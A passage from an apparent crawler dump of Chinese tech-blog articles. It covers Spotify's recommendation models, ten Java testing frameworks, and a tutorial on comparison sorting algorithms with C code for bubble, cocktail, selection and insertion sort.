来决定歌曲之间的相似度，以及根据用户听歌历史来判断哪些用户可能会喜欢它们。,\n,这些基本涵盖了为每周发现提供支持的推荐作业流程所依赖的三种主要模型。,\n,\n,[ Cassandra instances],\n,当然了，这些推荐模型也和 Spotify 其它更大的生态系统连接在一起，其中包括利用海量的数据存储以及,非常多,的 Hadoop 集群来做推荐服务的扩展，使得引擎得以计算巨型矩阵，无穷无尽的互联网音乐文章和大量的音频文件。,\n,我希望本文可以对你有所启发，并且像当时它对我一样能够激起你的好奇。怀着对幕后的机器学习技术的了解和感激之情，现在我将通过我自己的每周发现来寻找我喜欢的音乐。,\n,文章结束。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 4 收藏,\n\n                    , 1 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n,\r\n\t\r\n\t,\r\n\t关于作者：,XiaofengYue_DXY,\r\n\t,\r\n\t,\r\n\t\t,\r\n\t\t\t,\r\n\t\t,\r\n\t,\r\n\r\n    ,\r\n\r\n        ,\r\n            Backend Dev.        ,\r\n        ,\r\n            , 个人主页, ·\r\n            , 我的文章,\r\n\r\n             · , 10, · , ,         ,\r\n    ,\r\n\t,\r\n,\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/113821/", "url_object_id": "c9d9c3009f6783bc6fdee771e14f8aa2", "front_image_path": "full/3b7e7bed23407111b13cf9f458c1f31bf494ba05.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2015/11/58175e1df62779046a3a4e2483575937.jpg"], "title": "JAVA 程序员需要用到 10 个测试框架和库", "create_time": "2018/05/14", "vote": "1", "bookmark": 0, "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,本文由 ,伯乐在线, - ,搬砖大师傅, 翻译，,艾凌风, 校稿。未经许可，禁止转载！,英文出处：,Javin Paul  ,。欢迎加入,翻译组,。,\n,想要提高你的自动化测试技术？以下是 10 个优秀的测试框架和库，以及它们常见用法的概述。,\n,最近我写了一些文章，关于 Java 程序员今年应该学习什么，例如编程语言，库和框架等，如果只能学习或提高其中一项，那必然是自动化测试技能。,\n,测试是专业程序员区别于业余程序员的一项指标，作为专业程序员，并非必须采用 TDD，BDD 或其它测试方法论，但最低标准是通过编写代码的方式，来自动化测试自己的代码。,\n,许多 Java 程序员编写单元测试和集成测试，使用 Jenkins、TeamCity 等持续集成工具，在构建阶段自动运行。,\n,如果还有人对程序员是否应该关注自动化测试存有疑问，那么让我来回答，随着 DevOps 理念的增强和角色的涌现，自动化测试的重要性正在呈指数型增长。,\n,企业通常青睐那种擅长编写单元测试的程序员，这些程序员对各种单元测试框架、库和工具有着丰富的知识，比如 JUnit，Selenium，REST-Assured，Spock 框架等。,\n,作为 Java 程序员，我们在截然不同的领域工作，从编写 Java 核心代码到 JSP 页面，REST API，甚至有时为了构建自动化而去编写 Groovy 脚本，这就要求我们必需了解不同的自动化测试工具。,\n,举一个例子，很长一段时间内，我只了解 JUnit，但当不得不测试 JSP 页面时，我却束手无策，直到我找到了 Selenium。REST Assured 是另一个类似的例子，我通常使用 curl 命令测试 REST API，但 REST Assured 将 REST API 的单元测试水平提升到了另一个层次。,\n,Java 程序员需要用到十大单元测试和自动化集成测试工具,\n,我认为一个优秀的程序员，必然能够很好地利用手头上的工具，因此我总在业余时间学习和探索新的工具和库，以下列表是我部分研究成果。,\n,在这篇文章中，我将分享 10 个最为优秀且必不可少的工具，框架和库，这些可以帮助 java 程序员在各类 java 项目中编写单元测试和集成测试。,\n,JUnit,\n,JUnit 无须赘述，即便是初级Java程序员，可能也已经听说过它，你可以使用它编写 Java 代码的单元测试。,\n,几乎所有主流 IDE，例如 Eclipse，NetBeans 和 IntelliJ，都集成了 JUnit，可以直接在这些IDE中编写和运行单元测试。,\n,大多数人仍在使用 JUnit 4，即使 JUnit 5 已经发布，它很可能是今年下一个热点。通过 JUnit 5，可以将 JUnit 同时应用于单元测试和集成测试，并且它还支持 Java 8 的特性。,\n,\n,REST Assured,\n,用 Java 语言测试和验证 REST 服务，要难于 Groovy 这类动态语言。,\n,REST Assured 将这类语言的易用性带入了 Java 领域，是一个优秀的 REST API 的集成测试工具。,\n,\n,Selenium,\n,Selenium 很可能是最流行的 Java UI 测试工具了，它可以让你在不必启动浏览器的情况下测试 JSP 页面。,\n,你可以使用 JUnit 和 Selenium 来测试 Web 程序的界面，它甚至允许你编写 Web 应用程序的验收测试。,\n,\n,TestNG,\n,TestNG 是一个测试框架，其灵感来自 JUnit 和 NUnit，但同时引入了一些新的功能，使其功能更强大，使用更方便。例如可以使用注解，在任意大的线程池中，配置各种可用策略进行测试（例如所有方法都在自己的线程中，每一个测试类使用一个线程等）。,\n,因为 TestNG 使用 JUnit 4 的注解，同时又集成了 HAMCSTREST 匹配器，它与 JUnit 的差异已经减小了，但两者如何选择，这取决于你。,\n,\n,Mockito,\n,Java 类有许多 Mock 框架，例如 PowerMock 和 JMock，但我个人偏向于 ,Mockito,，因为它有简单的 API，优秀的文档以及大量的示例。,\n,Mocking 是现代单元测试的一项关键技术，因为它允许你在没有任何依赖的情况下独立测试代码，这就是为什么我鼓励每个 Java 程序员在学习 JUnit 的同时，一起学习 Mocking 框架的原因。,\n,我最喜欢的 mocking 框架是 Mockito，但如果你愿意，也可以研究下 PowerMock 或 JMock。,\n,Spock框架,\n,Spock 是另一个测试和规范框架，用于 Java 和 Groovy 应用程序。由于使用 Groovy 编写，Spock 成为一种兼具丰富表现力且简明扼要的规范语言。,\n,当你使用 Spock 时，你的测试将变得更容易阅读和维护，这得益于它采用的 JUnit 运行器，Spock 兼容大部分 IDE，构建工具和持续集成服务器。,\n,可惜我没有找到有助于学习 Spock 框架的课程，但阅读《,Java Testing with Spock,》这本书是很好的开始。,\n,\n,Cucumber,\n,Cucumber 是另一个重要的自动化集成测试工具，但与其它同类别的工具不同的是它能够针对规格文档进行自动化测试。,\n,Cucumber 将规格文档和测试文档合成整个动态文档，同时 Cucumber 自动测试这个文档，使测试规范始终保持在最新版本。,\n,\n,Spring Test,\n,Spring MVC 自带一个很有用的测试框架，它可以在不引入 Web 容器的情况下进行深入测试。,\n,Spring Test 是为 Spring 程序编写自动化测试的最有用的库之一。为了给 Spring 驱动的应用程序（包括 MVC 控制器在内），编写单元测试和集成测试，Spring Test 提供了一流的支持。,\n,另外，Spring Test DbUnit 集成了 Spring Test 框架与 DbUnit；Spring Test MVC HtmlUnit 集成了Spring Test MVC 框架和 HtmlUnit。,\n,通过使用这些工具，你可以轻松地自动测试 Spring MVC 应用程序。,\n,DBUnit,\n,数据库是许多 Java 应用程序，包括核心 Java 和 Web 应用程序中不可或缺的部分，也有可能是单元测试的最大障碍。,\n,在进行集成测试时，连接开发环境或用户验收测试的数据库并不可靠，因为任何人都可以更改数据模式和数据本身，例如表和存储过程等，这会导致自动化集成测试失败。,\n,DbUnit 是一个 JUnit 扩展，每次集成测试前，将数据库初始化成已知状态，确保数据库存储正确的数据。,\n,DbUnit 自身还存在着一些问题，但它是一个非常有用的工具，因为它可以帮助我们分离测试数据与测试代码。,\n,\n,Robot 框架,\n,Robot 框架是一个基于 Python 的通用测试自动化框架，用于验收测试和验收测试驱动开发。,\n,它是一个由关键字驱动的，使用表格测试数据语法的测试框架，可以用来测试那些涉及多种技术和接口的分布式异构应用。,\n,如果你打算学习这个优秀的集成测试框架，那么你可以从 Udemy 上的《,Robot 框架测试自动化,》的课程开始，这是一个很好的学习资源。,\n,该课程涵盖了两部分内容，Robot 框架基础和高级特性。,\n,\n,结论,\n,以上列举了Java 程序员需要用到的单元测试和集成测试工具，框架和库。,\n,还有很多库没有包括在这个列表中，例如 AssertJ 和 Hamcrest，它们可以帮助你写出漂亮且流畅的测试，但学习需要一步步来。,\n,首先，学习一个可以应用于日常工作的工具或库。 例如，如果你正在使用 Java UI，那么首先应该学习 Selenium，这样你可以有更多时间专注在这个工具上。,\n,同样的，如果你的工作内容是 REST API，请学习 REST Assured（参阅 ,REST with Spring,）；如果你正在做很多核心 Java 的工作，那么 JUnit 5 可能是你首先需要关注的库。,\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        ,  收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n,\r\n\t\r\n\t,\r\n\t关于作者：,搬砖大师傅,\r\n\t,\r\n\t,\r\n\t\t,\r\n\t\t\t,\r\n\t\t,\r\n\t,\r\n\r\n    ,\r\n\r\n        ,\r\n            对大数据，金融IT开发有兴趣，对量化交易有兴趣        ,\r\n        ,\r\n            , 个人主页, ·\r\n            , 我的文章,\r\n\r\n             · , 10, · , ,         ,\r\n    ,\r\n\t,\r\n,\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/113952/", "url_object_id": "41201d7935af5be0d5b31cfa94a23f85", "front_image_path": "full/d21139b01c705ad942c01fc98ce02e6dc9a5a1c3.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2014/10/a1a4de99de0c75eab712542a7dac876f.png"], "title": "常用排序算法总结（1）", "create_time": "2018/05/11", "vote": "2", "bookmark": "19", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,SteveWang,   ,我们通常所说的排序算法往往指的是,内部排序算法,，即数据记录在内存中进行排序。,\n,排序算法大体可分为两种：,\n,一种是,比较排序,，时间复杂度O(nlogn) ~ O(n^2)，主要有：,冒泡排序,，,选择排序,，,插入排序,，,归并排序,，,堆排序,，,快速排序,等。,\n,另一种是,非比较排序,，时间复杂度可以达到O(n)，主要有：,计数排序,，,基数排序,，,桶排序,等。,\n,这里我们来探讨一下常用的比较排序算法，非比较排序算法将在下一篇文章中介绍。下表给出了常见比较排序算法的性能：,\n,\n,有一点我们很容易忽略的是,排序算法的稳定性,(腾讯校招2016笔试题曾考过)。,\n,排序算法稳定性的简单形式化定义为：,如果A,i, = A,j,，排序前A,i,在A,j,之前，排序后A,i,还在A,j,之前，则称这种排序算法是稳定的。,通俗地讲就是保证排序前后两个相等的数的相对顺序不变。,\n,对于不稳定的排序算法，只要举出一个实例，即可说明它的不稳定性；而对于稳定的排序算法，必须对算法进行分析从而得到稳定的特性。需要注意的是，排序算法是否为稳定的是由具体算法决定的，不稳定的算法在某种条件下可以变为稳定的算法，而稳定的算法在某种条件下也可以变为不稳定的算法。,\n,例如，对于冒泡排序，原本是稳定的排序算法，如果将记录交换的条件改成A[i] >= A[i + 1]，则两个相等的记录就会交换位置，从而变成不稳定的排序算法。,\n,其次，说一下排序算法稳定性的好处。,排序算法如果是稳定的，那么从一个键上排序，然后再从另一个键上排序，前一个键排序的结果可以为后一个键排序所用。,基数排序就是这样，先按低位排序，逐次按高位排序，低位排序后元素的顺序在高位也相同时是不会改变的。,\n,冒泡排序(Bubble Sort),\n,冒泡排序是一种极其简单的排序算法，也是我所学的第一个排序算法。它重复地走访过要排序的元素，依次比较相邻两个元素，如果他们的顺序错误就把他们调换过来，直到没有元素再需要交换，排序完成。这个算法的名字由来是因为越小(或越大)的元素会经由交换慢慢“浮”到数列的顶端。,\n,冒泡排序算法的运作如下：,\n,\n,比较相邻的元素，如果前一个比后一个大，就把它们两个调换位置。,\n,对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。这步做完后，最后的元素会是最大的数。,\n,针对所有的元素重复以上的步骤，除了最后一个。,\n,持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。,\n,\n,由于它的简洁，冒泡排序通常被用来对于程序设计入门的学生介绍算法的概念。冒泡排序的代码如下：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n#include <stdio.h>\r\n\r\n// 分类 -------------- 内部比较排序\r\n// 数据结构 ---------- 数组\r\n// 最差时间复杂度 ---- O(n^2)\r\n// 最优时间复杂度 ---- 如果能在内部循环第一次运行时,使用一个旗标来表示有无需要交换的可能,可以把最优时间复杂度降低到O(n)\r\n// 平均时间复杂度 ---- O(n^2)\r\n// 所需辅助空间 ------ O(1)\r\n// 稳定性 ------------ 稳定\r\n\r\nvoid Swap(int A[], int i, int j)\r\n{\r\n    int temp = A[i];\r\n    A[i] = A[j];\r\n    A[j] = temp;\r\n}\r\n\r\nvoid BubbleSort(int A[], int n)\r\n{\r\n    for (int j = 0; j < n - 1; j++)         // 每次最大元素就像气泡一样\"浮\"到数组的最后\r\n    {\r\n        for (int i = 0; i < n - 1 - j; i++) // 依次比较相邻的两个元素,使较大的那个向后移\r\n        {\r\n            if (A[i] > A[i + 1])            // 如果条件改成A[i] >= A[i + 1],则变为不稳定的排序算法\r\n            {\r\n                Swap(A, i, i + 1);\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    int A[] = { 6, 5, 3, 1, 8, 7, 2, 4 };    // 从小到大冒泡排序\r\n    int n = sizeof(A) / sizeof(int);\r\n    BubbleSort(A, n);\r\n    printf(\"冒泡排序结果：\");\r\n    for (int i = 0; i < n; i++)\r\n    {\r\n        printf(\"%d \", A[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    return 0;\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,#include <stdio.h>, ,// 分类 -------------- 内部比较排序,// 数据结构 ---------- 数组,// 最差时间复杂度 ---- O(n^2),// 最优时间复杂度 ---- 如果能在内部循环第一次运行时,使用一个旗标来表示有无需要交换的可能,可以把最优时间复杂度降低到O(n),// 平均时间复杂度 ---- O(n^2),// 所需辅助空间 ------ O(1),// 稳定性 ------------ 稳定, ,void, ,Swap,(,int, ,A,[,],,, ,int, ,i,,, ,int, ,j,),{,    ,int, ,temp, ,=, ,A,[,i,],;,    ,A,[,i,], ,=, ,A,[,j,],;,    ,A,[,j,], ,=, ,temp,;,}, ,void, ,BubbleSort,(,int, ,A,[,],,, ,int, ,n,),{,    ,for, ,(,int, ,j, ,=, ,0,;, ,j, ,<, ,n, ,-, ,1,;, ,j,++,),         ,// 每次最大元素就像气泡一样\"浮\"到数组的最后,    ,{,        ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,n, ,-, ,1, ,-, ,j,;, ,i,++,), ,// 依次比较相邻的两个元素,使较大的那个向后移,        ,{,            ,if, ,(,A,[,i,], ,>, ,A,[,i, ,+, ,1,],),            ,// 如果条件改成A[i] >= A[i + 1],则变为不稳定的排序算法,            ,{,                ,Swap,(,A,,, ,i,,, ,i, ,+, ,1,),;,            ,},        ,},    ,},}, ,int, ,main,(,),{,    ,int, ,A,[,], ,=, ,{, ,6,,, ,5,,, ,3,,, ,1,,, ,8,,, ,7,,, ,2,,, ,4, ,},;,    ,// 从小到大冒泡排序,    ,int, ,n, ,=, ,sizeof,(,A,), ,/, ,sizeof,(,int,),;,    ,BubbleSort,(,A,,, ,n,),;,    ,printf,(,\"冒泡排序结果：\",),;,    ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,n,;, ,i,++,),    ,{,        ,printf,(,\"%d \",,, ,A,[,i,],),;,    ,},    ,printf,(,\"\\n\",),;,    ,return, ,0,;,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,上述代码对序列{ 6, 5, 3, 1, 8, 7, 2, 4 }进行冒泡排序的实现过程如下,\n,\n,使用冒泡排序为一列数字进行排序的过程如右图所示：,\n,\n,尽管冒泡排序是最容易了解和实现的排序算法之一，但它对于少数元素之外的数列排序是很没有效率的。,\n,冒泡排序的改进：,鸡尾酒排序,\n,鸡尾酒排序，也叫,定向冒泡排序,，是冒泡排序的一种改进。此算法与冒泡排序的不同处在于,从低到高然后从高到低,，而冒泡排序则仅从低到高去比较序列里的每个元素。他可以得到比冒泡排序稍微好一点的效能。,\n,鸡尾酒排序的代码如下：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n#include <stdio.h>\r\n\r\n// 分类 -------------- 内部比较排序\r\n// 数据结构 ---------- 数组\r\n// 最差时间复杂度 ---- O(n^2)\r\n// 最优时间复杂度 ---- 如果序列在一开始已经大部分排序过的话,会接近O(n)\r\n// 平均时间复杂度 ---- O(n^2)\r\n// 所需辅助空间 ------ O(1)\r\n// 稳定性 ------------ 稳定\r\n\r\nvoid Swap(int A[], int i, int j)\r\n{\r\n    int temp = A[i];\r\n    A[i] = A[j];\r\n    A[j] = temp;\r\n}\r\n\r\nvoid CocktailSort(int A[], int n)\r\n{\r\n    int left = 0;                            // 初始化边界\r\n    int right = n - 1;\r\n    while (left < right)\r\n    {\r\n        for (int i = left; i < right; i++)   // 前半轮,将最大元素放到后面\r\n        {\r\n            if (A[i] > A[i + 1])\r\n            {\r\n                Swap(A, i, i + 1);\r\n            }\r\n        }\r\n        right--;\r\n        for (int i = right; i > left; i--)   // 后半轮,将最小元素放到前面\r\n        {\r\n            if (A[i - 1] > A[i])\r\n            {\r\n                Swap(A, i - 1, i);\r\n            }\r\n        }\r\n        left++;\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    int A[] = { 6, 5, 3, 1, 8, 7, 2, 4 };   // 从小到大定向冒泡排序\r\n    int n = sizeof(A) / sizeof(int);\r\n    CocktailSort(A, n);\r\n    printf(\"鸡尾酒排序结果：\");\r\n    for (int i = 0; i < n; i++)\r\n    {\r\n        printf(\"%d \", A[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    return 0;\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,#include <stdio.h>, ,// 分类 -------------- 内部比较排序,// 数据结构 ---------- 数组,// 最差时间复杂度 ---- O(n^2),// 最优时间复杂度 ---- 如果序列在一开始已经大部分排序过的话,会接近O(n),// 平均时间复杂度 ---- O(n^2),// 所需辅助空间 ------ O(1),// 稳定性 ------------ 稳定, ,void, ,Swap,(,int, ,A,[,],,, ,int, ,i,,, ,int, ,j,),{,    ,int, ,temp, ,=, ,A,[,i,],;,    ,A,[,i,], ,=, ,A,[,j,],;,    ,A,[,j,], ,=, ,temp,;,}, ,void, ,CocktailSort,(,int, ,A,[,],,, ,int, ,n,),{,    ,int, ,left, ,=, ,0,;,                            ,// 初始化边界,    ,int, ,right, ,=, ,n, ,-, ,1,;,    ,while, ,(,left, ,<, ,right,),    ,{,        ,for, ,(,int, ,i, ,=, ,left,;, ,i, ,<, ,right,;, ,i,++,),   ,// 前半轮,将最大元素放到后面,        ,{,            ,if, ,(,A,[,i,], ,>, ,A,[,i, ,+, ,1,],),            ,{,                ,Swap,(,A,,, ,i,,, ,i, ,+, ,1,),;,            ,},        ,},        ,right,--,;,        ,for, ,(,int, ,i, ,=, ,right,;, ,i, ,>, ,left,;, ,i,--,),   ,// 后半轮,将最小元素放到前面,        ,{,            ,if, ,(,A,[,i, ,-, ,1,], ,>, ,A,[,i,],),            ,{,                ,Swap,(,A,,, ,i, ,-, ,1,,, ,i,),;,            ,},        ,},        ,left,++,;,    ,},}, ,int, ,main,(,),{,    ,int, ,A,[,], ,=, ,{, ,6,,, ,5,,, ,3,,, ,1,,, ,8,,, ,7,,, ,2,,, ,4, ,},;,   ,// 从小到大定向冒泡排序,    ,int, ,n, ,=, ,sizeof,(,A,), ,/, ,sizeof,(,int,),;,    ,CocktailSort,(,A,,, ,n,),;,    ,printf,(,\"鸡尾酒排序结果：\",),;,    ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,n,;, ,i,++,),    ,{,        ,printf,(,\"%d \",,, ,A,[,i,],),;,    ,},    ,printf,(,\"\\n\",),;,    ,return, ,0,;,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,使用鸡尾酒排序为一列数字进行排序的过程如右图所示：,\n,\n,以序列(2,3,4,5,1)为例，鸡尾酒排序只需要访问一次序列就可以完成排序，但如果使用冒泡排序则需要四次。但是在乱数序列的状态下，鸡尾酒排序与冒泡排序的效率都很差劲。,\n,　　,\n,选择排序(Selection Sort),\n,选择排序也是一种简单直观的排序算法。它的工作原理很容易理解：初始时在序列中找到最小（大）元素，放到序列的起始位置作为已排序序列；然后，再从剩余未排序元素中继续寻找最小（大）元素，放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。,\n,注意选择排序与冒泡排序的区别：冒泡排序通过依次交换相邻两个顺序不合法的元素位置，从而将当前最小（大）元素放到合适的位置；而选择排序每遍历一次都记住了当前最小（大）元素的位置，最后仅需一次交换操作即可将其放到合适的位置。,\n,选择排序的代码如下：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n#include <stdio.h>\r\n\r\n// 分类 -------------- 内部比较排序\r\n// 数据结构 ---------- 数组\r\n// 最差时间复杂度 ---- O(n^2)\r\n// 最优时间复杂度 ---- O(n^2)\r\n// 平均时间复杂度 ---- O(n^2)\r\n// 所需辅助空间 ------ O(1)\r\n// 稳定性 ------------ 不稳定\r\n\r\nvoid Swap(int A[], int i, int j)\r\n{\r\n    int temp = A[i];\r\n    A[i] = A[j];\r\n    A[j] = temp;\r\n}\r\n\r\nvoid SelectionSort(int A[], int n)\r\n{\r\n    for (int i = 0; i < n - 1; i++)         // i为已排序序列的末尾\r\n    {\r\n        int min = i;\r\n        for (int j = i + 1; j < n; j++)     // 未排序序列\r\n        {\r\n            if (A[j] < A[min])              // 找出未排序序列中的最小值\r\n            {\r\n                min = j;\r\n            }\r\n        }\r\n        if (min != i)\r\n        {\r\n            Swap(A, min, i);    // 放到已排序序列的末尾，该操作很有可能把稳定性打乱，所以选择排序是不稳定的排序算法\r\n        }\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    int A[] = { 8, 5, 2, 6, 9, 3, 1, 4, 0, 7 }; // 从小到大选择排序\r\n    int n = sizeof(A) / sizeof(int);\r\n    SelectionSort(A, n);\r\n    printf(\"选择排序结果：\");\r\n    for (int i = 0; i < n; i++)\r\n    {\r\n        printf(\"%d \", A[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    return 0;\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,#include <stdio.h>, ,// 分类 -------------- 内部比较排序,// 数据结构 ---------- 数组,// 最差时间复杂度 ---- O(n^2),// 最优时间复杂度 ---- O(n^2),// 平均时间复杂度 ---- O(n^2),// 所需辅助空间 ------ O(1),// 稳定性 ------------ 不稳定, ,void, ,Swap,(,int, ,A,[,],,, ,int, ,i,,, ,int, ,j,),{,    ,int, ,temp, ,=, ,A,[,i,],;,    ,A,[,i,], ,=, ,A,[,j,],;,    ,A,[,j,], ,=, ,temp,;,}, ,void, ,SelectionSort,(,int, ,A,[,],,, ,int, ,n,),{,    ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,n, ,-, ,1,;, ,i,++,),         ,// i为已排序序列的末尾,    ,{,        ,int, ,min, ,=, ,i,;,        ,for, ,(,int, ,j, ,=, ,i, ,+, ,1,;, ,j, ,<, ,n,;, ,j,++,),     ,// 未排序序列,        ,{,            ,if, ,(,A,[,j,], ,<, ,A,[,min,],),              ,// 找出未排序序列中的最小值,            ,{,                ,min, ,=, ,j,;,            ,},        ,},        ,if, ,(,min, ,!=, ,i,),        ,{,            ,Swap,(,A,,, ,min,,, ,i,),;,    ,// 放到已排序序列的末尾，该操作很有可能把稳定性打乱，所以选择排序是不稳定的排序算法,        ,},    ,},}, ,int, ,main,(,),{,    ,int, ,A,[,], ,=, ,{, ,8,,, ,5,,, ,2,,, ,6,,, ,9,,, ,3,,, ,1,,, ,4,,, ,0,,, ,7, ,},;, ,// 从小到大选择排序,    ,int, ,n, ,=, ,sizeof,(,A,), ,/, ,sizeof,(,int,),;,    ,SelectionSort,(,A,,, ,n,),;,    ,printf,(,\"选择排序结果：\",),;,    ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,n,;, ,i,++,),    ,{,        ,printf,(,\"%d \",,, ,A,[,i,],),;,    ,},    ,printf,(,\"\\n\",),;,    ,return, ,0,;,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,上述代码对序列{ 8, 5, 2, 6, 9, 3, 1, 4, 0, 7 }进行选择排序的实现过程如右图：,\n,\n,使用选择排序为一列数字进行排序的宏观过程：,\n,\n,选择排序是不稳定的排序算法，不稳定发生在最小元素与A[i]交换的时刻。,\n,比如序列：{ 5, 8, 5, 2, 9 }，一次选择的最小元素是2，然后把2和第一个5进行交换，从而改变了两个元素5的相对次序。,\n,插入排序(Insertion Sort),\n,插入排序是一种简单直观的排序算法。它的工作原理非常类似于我们抓扑克牌,\n,\n,对于未排序数据(右手抓到的牌)，在已排序序列(左手已经排好序的手牌)中从后向前扫描，找到相应位置并插入。,\n,插入排序在实现上，通常采用in-place排序（即只需用到O(1)的额外空间的排序），因而在从后向前扫描过程中，需要反复把已排序元素逐步向后挪位，为最新元素提供插入空间。,\n,具体算法描述如下：,\n,\n,从第一个元素开始，该元素可以认为已经被排序,\n,取出下一个元素，在已经排序的元素序列中从后向前扫描,\n,如果该元素（已排序）大于新元素，将该元素移到下一位置,\n,重复步骤3，直到找到已排序的元素小于或者等于新元素的位置,\n,将新元素插入到该位置后,\n,重复步骤2~5,\n,\n,插入排序的代码如下：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n#include <stdio.h>\r\n\r\n// 分类 ------------- 内部比较排序\r\n// 数据结构 ---------- 数组\r\n// 最差时间复杂度 ---- 最坏情况为输入序列是降序排列的,此时时间复杂度O(n^2)\r\n// 最优时间复杂度 ---- 最好情况为输入序列是升序排列的,此时时间复杂度O(n)\r\n// 平均时间复杂度 ---- O(n^2)\r\n// 所需辅助空间 ------ O(1)\r\n// 稳定性 ------------ 稳定\r\n\r\nvoid InsertionSort(int A[], int n)\r\n{\r\n    for (int i = 1; i < n; i++)         // 类似抓扑克牌排序\r\n    {\r\n        int get = A[i];                 // 右手抓到一张扑克牌\r\n        int j = i - 1;                  // 拿在左手上的牌总是排序好的\r\n        while (j >= 0 && A[j] > get)    // 将抓到的牌与手牌从右向左进行比较\r\n        {\r\n            A[j + 1] = A[j];            // 如果该手牌比抓到的牌大，就将其右移\r\n            j--;\r\n        }\r\n        A[j + 1] = get; // 直到该手牌比抓到的牌小(或二者相等)，将抓到的牌插入到该手牌右边(相等元素的相对次序未变，所以插入排序是稳定的)\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    int A[] = { 6, 5, 3, 1, 8, 7, 2, 4 };// 从小到大插入排序\r\n    int n = sizeof(A) / sizeof(int);\r\n    InsertionSort(A, n);\r\n    printf(\"插入排序结果：\");\r\n    for (int i = 0; i < n; i++)\r\n    {\r\n        printf(\"%d \", A[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    return 0;\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,#include <stdio.h>, ,// 分类 ------------- 内部比较排序,// 数据结构 ---------- 数组,// 最差时间复杂度 ---- 最坏情况为输入序列是降序排列的,此时时间复杂度O(n^2),// 最优时间复杂度 ---- 最好情况为输入序列是升序排列的,此时时间复杂度O(n),// 平均时间复杂度 ---- O(n^2),// 所需辅助空间 ------ O(1),// 稳定性 ------------ 稳定, ,void, ,InsertionSort,(,int, ,A,[,],,, ,int, ,n,),{,    ,for, ,(,int, ,i, ,=, ,1,;, ,i, ,<, ,n,;, ,i,++,),         ,// 类似抓扑克牌排序,    ,{,        ,int, ,get, ,=, ,A,[,i,],;,                 ,// 右手抓到一张扑克牌,        ,int, ,j, ,=, ,i, ,-, ,1,;,                  ,// 拿在左手上的牌总是排序好的,        ,while, ,(,j, ,>=, ,0, ,&&, ,A,[,j,], ,>, ,get,),    ,// 将抓到的牌与手牌从右向左进行比较,        ,{,            ,A,[,j, ,+, ,1,], ,=, ,A,[,j,],;,            ,// 如果该手牌比抓到的牌大，就将其右移,            ,j,--,;,        ,},        ,A,[,j, ,+, ,1,], ,=, ,get,;, ,// 直到该手牌比抓到的牌小(或二者相等)，将抓到的牌插入到该手牌右边(相等元素的相对次序未变，所以插入排序是稳定的),    ,},}, ,int, ,main,(,),{,    ,int, ,A,[,], ,=, ,{, 